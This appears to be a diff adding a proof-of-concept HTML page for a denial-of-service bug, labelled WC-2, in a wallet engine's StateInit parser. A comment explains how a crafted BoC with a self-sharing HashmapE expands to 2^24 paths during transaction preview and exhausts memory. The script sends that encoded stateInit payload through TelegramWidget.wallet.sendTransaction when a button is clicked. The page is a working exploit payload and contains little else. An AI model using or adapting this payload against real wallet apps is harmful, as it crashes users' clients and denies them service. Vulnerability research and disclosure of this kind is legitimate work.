@@ -1,0 +1,22 @@
+<!doctype html><body>
+<!-- WC-2: exponential HashmapE DAG in StateInit::from_boc (wallet-engine TLB reader).
+     stateInit is a valid single-root BoC (passes isValidCellBoc) whose root is a
+     StateInit with a library HashmapE that fans out over shared refs. The wallet
+     preview (nativePreviewTonConnect -> prepare_transfer_emulation ->
+     build_internal_messages -> StateInit::from_boc) expands 2^24 key paths.
+     Host: depth 20 = 1M entries/557 MB/1.95 s; depth 22 aborts on a 813 MB alloc
+     under a 1.5 GB cap. DoS only (OOM/ANR); not memory corruption. -->
+<button id="b">Open</button>
+<script>
+"use strict";
+document.getElementById("b").addEventListener("click", function () {
+  TelegramWidget.wallet.sendTransaction({
+    messages: [{
+      address: "EQAQAUqxkIId2T0l1v0CBjczoPW7pS-5pQ0-J2Ap1pvac9XY",
+      amount: "1",
+      stateInit: "te6ccgEBGwEAtgABAQwBAgFIAgICAUgDAwIBSAQEAgFIBQUCAUgGBgIBSAcHAgFICAgCAUgJCQIBSAoKAgFICwsCAUgMDAIBSA0NAgFIDg4CAUgPDwIBSBAQAgFIERECAUgSEgIBSBMTAgFIFBQCAUgVFQIBSBYWAgFIFxcCAUgYGAIBSBkZAWl//////////////////////////////////4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEBoAAA=="
+    }]
+  }, "x");
+});
+</script>
+</body>
